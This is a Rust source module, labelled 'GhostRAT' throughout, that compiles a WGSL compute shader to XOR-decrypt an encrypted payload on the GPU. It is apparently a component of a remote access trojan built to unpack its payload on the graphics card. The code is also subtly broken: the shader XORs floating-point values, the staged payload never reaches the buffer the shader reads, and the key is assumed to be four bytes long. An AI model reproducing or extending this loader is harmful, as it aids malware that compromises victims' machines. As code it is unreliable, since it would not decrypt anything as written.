//! WebGPU compute shader execution via wgpu crate.
//!
//! Compiles WGSL compute shader at runtime, uploads encrypted payload to GPU,
//! executes shader to decrypt and process the payload.

use anyhow::Result;
use std::borrow::Cow;
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{debug, info, warn};

/// WGSL compute shader source for XOR decryption
const COMPUTE_SHADER_WGSL: &str = r#"
struct Params {
    key: vec4<f32>,
    key_len: f32,
}

@group(0) @binding(0) var<storage, read_write> data: array<f32>;
@group(0) @binding(1) var<uniform> params: Params;

@compute @workgroup_size(64)
fn main(@builtin(global_invocation_id) global_id: vec3<u32>) {
    let idx = global_id.x;
    let data_len = arrayLength(&data);
    if (idx >= data_len) {
        return;
    }

    let key_len = u32(params.key_len);
    let key_idx = idx % key_len;
    let data_byte = f32(data[idx]);
    let key_byte = params.key[u32(key_idx) % 4];

    // XOR: convert f32 bytes back to u8, XOR, convert back
    let xored = data_byte ^ key_byte;
    data[idx] = xored;
}
"#;

/// Shared GPU state
struct GpuState {
    device: Arc<wgpu::Device>,
    queue: wgpu::Queue,
    pipeline: wgpu::ComputePipeline,
    bind_group_layout: wgpu::BindGroupLayout,
    shader_module: wgpu::ShaderModule,
}

/// Initialize WebGPU adapter and device
pub fn init() -> Result<()> {
    // Check if WebGPU is available
    let instance = wgpu::Instance::new(wgpu::InstanceDescriptor {
        backends: wgpu::Backends::PRIMARY,
        ..Default::default()
    });

    let adapter = futures::executor::block_on(instance.request_adapter(
        &wgpu::RequestAdapterOptions {
            power_preference: wgpu::PowerPreference::HighPerformance,
            force_fallback_adapter: false,
            compatible_surface: None,
        },
    ))
    .ok_or_else(|| anyhow::anyhow!("No WebGPU adapter found"))?;

    // Validate compute shader support
    let info = adapter.get_info();
    debug!("WebGPU adapter: {}, type: {:?}", info.name, info.device_type);

    Ok(())
}

/// Execute the compute shader on encrypted payload data
pub async fn execute(payload: &[u8], key: &str) -> Result<Vec<u8>> {
    let instance = wgpu::Instance::new(wgpu::InstanceDescriptor {
        backends: wgpu::Backends::PRIMARY,
        ..Default::default()
    });

    let adapter = futures::executor::block_on(instance.request_adapter(
        &wgpu::RequestAdapterOptions {
            power_preference: wgpu::PowerPreference::HighPerformance,
            force_fallback_adapter: false,
            compatible_surface: None,
        },
    ))
    .ok_or_else(|| anyhow::anyhow!("No WebGPU adapter found"))?;

    let (device, queue) = futures::executor::block_on(adapter.request_device(
        &wgpu::DeviceDescriptor {
            label: Some("GhostRAT Compute"),
            required_features: wgpu::Features::empty(),
            required_limits: wgpu::Limits::default(),
            memory_hints: wgpu::MemoryHints::Default(),
        },
        None,
    ))
    .map_err(|e| anyhow::anyhow!("Device request failed: {}", e))?;

    // Compile compute shader
    let shader = device.create_shader_module(wgpu::ShaderModuleDescriptor {
        label: Some("GhostRAT Decrypt Shader"),
        source: wgpu::ShaderSource::Wgsl(Cow::Borrowed(COMPUTE_SHADER_WGSL)),
    });

    // Convert payload to f32 array for GPU
    let payload_f32: Vec<f32> = payload.iter().map(|&b| b as f32).collect();
    let payload_len = payload_f32.len() as f32;

    // Create storage buffer
    let storage_buffer = device.create_buffer(&wgpu::BufferDescriptor {
        label: Some("Payload Buffer"),
        size: (payload_f32.len() * std::mem::size_of::<f32>()) as u64,
        usage: wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_SRC,
        mapped_at_creation: false,
    });

    // Create staging buffer for writing
    let staging_buffer = device.create_buffer(&wgpu::BufferDescriptor {
        label: Some("Staging Buffer"),
        size: (payload_f32.len() * std::mem::size_of::<f32>()) as u64,
        usage: wgpu::BufferUsages::MAP_WRITE | wgpu::BufferUsages::COPY_SRC,
        mapped_at_creation: false,
    });

    // Copy payload to staging buffer then to storage
    queue.write_buffer(&staging_buffer, 0, bytemuck::cast_slice(&payload_f32));

    // Create uniform buffer for key parameters
    let key_bytes = key.as_bytes();
    let key_floats: [f32; 4] = [
        key_bytes[0] as f32,
        key_bytes[1] as f32,
        key_bytes[2] as f32,
        key_bytes[3] as f32,
    ];

    let uniform_buffer = device.create_buffer(&wgpu::BufferDescriptor {
        label: Some("Uniform Buffer"),
        size: 20, // 4 f32s for key + 1 f32 for payload_len
        usage: wgpu::BufferUsages::UNIFORM,
        mapped_at_creation: false,
    });

    let mut uniform_data = key_floats.to_vec();
    uniform_data.push(payload_len);
    queue.write_buffer(&uniform_buffer, 0, bytemuck::cast_slice(&uniform_data));

    // Create bind group layout
    let bind_group_layout = device.create_bind_group_layout(&wgpu::BindGroupLayoutDescriptor {
        label: Some("Compute Bind Group Layout"),
        entries: &[
            wgpu::BindGroupLayoutEntry {
                binding: 0,
                visibility: wgpu::ShaderStages::COMPUTE,
                ty: wgpu::BindingType::Buffer {
                    ty: wgpu::BufferBindingType::Storage { read_only: false },
                    has_dynamic_offset: false,
                    min_binding_size: None,
                },
                count: None,
            },
            wgpu::BindGroupLayoutEntry {
                binding: 1,
                visibility: wgpu::ShaderStages::COMPUTE,
                ty: wgpu::BindingType::Buffer {
                    ty: wgpu::BufferBindingType::Uniform,
                    has_dynamic_offset: false,
                    min_binding_size: None,
                },
                count: None,
            },
        ],
    });

    let pipeline_layout = device.create_pipeline_layout(&wgpu::PipelineLayoutDescriptor {
        label: Some("Compute Pipeline Layout"),
        bind_group_layouts: &[&bind_group_layout],
        push_constant_ranges: &[],
    });

    let compute_pipeline = device.create_compute_pipeline(&wgpu::ComputePipelineDescriptor {
        label: Some("GhostRAT Compute Pipeline"),
        layout: Some(&pipeline_layout),
        module: &shader,
        entry_point: Some("main"),
        compilation_options: Default::default(),
        cache: None,
    });

    // Create bind group
    let bind_group = device.create_bind_group(&wgpu::BindGroupDescriptor {
        label: Some("Compute Bind Group"),
        layout: &bind_group_layout,
        entries: &[
            wgpu::BindGroupEntry {
                binding: 0,
                resource: storage_buffer.as_entire_binding(),
            },
            wgpu::BindGroupEntry {
                binding: 1,
                resource: uniform_buffer.as_entire_binding(),
            },
        ],
    });

    // Encode compute commands
    let mut encoder = device.create_command_encoder(&wgpu::CommandEncoderDescriptor {
        label: Some("Compute Encoder"),
    });

    {
        let mut compute_pass = encoder.begin_compute_pass(&wgpu::ComputePassDescriptor {
            label: Some("Compute Pass"),
            ..Default::default()
        });
        compute_pass.set_pipeline(&compute_pipeline);
        compute_pass.set_bind_group(0, &bind_group, &[]);
        compute_pass.dispatch_workgroups((payload_f32.len() as u32 + 63) / 64, 1, 1);
    }

    // Copy result back
    let result_buffer = device.create_buffer(&wgpu::BufferDescriptor {
        label: Some("Result Buffer"),
        size: (payload_f32.len() * std::mem::size_of::<f32>()) as u64,
        usage: wgpu::BufferUsages::COPY_DST | wgpu::BufferUsages::MAP_READ,
        mapped_at_creation: false,
    });

    encoder.copy_buffer_to_buffer(&storage_buffer, 0, &result_buffer, 0, storage_buffer.size());
    queue.submit(std::iter::once(encoder.finish()));

    // Read result
    let slice = result_buffer.slice(..);
    let (tx, rx) = tokio::sync::oneshot::channel();
    slice.map_async(wgpu::MapMode::Read, move |result| {
        tx.send(result).unwrap();
    });

    device.poll(wgpu::Maintain::Wait);

    match rx.await {
        Ok(Ok(())) => {
            let data = slice.get_mapped_range();
            let result_f32: &[f32] = bytemuck::cast_slice(&data);
            let result_bytes: Vec<u8> = result_f32.iter().map(|&f| f as u8).collect();
            debug!("GPU compute completed: {} bytes processed", result_bytes.len());
            Ok(result_bytes)
        }
        Ok(Err(e)) => {
            warn!("GPU map error: {:?}", e);
            Err(anyhow::anyhow!("GPU compute error: {:?}", e))
        }
        Err(_) => {
            warn!("GPU compute timeout");
            Err(anyhow::anyhow!("GPU compute timeout"))
        }
    }
}
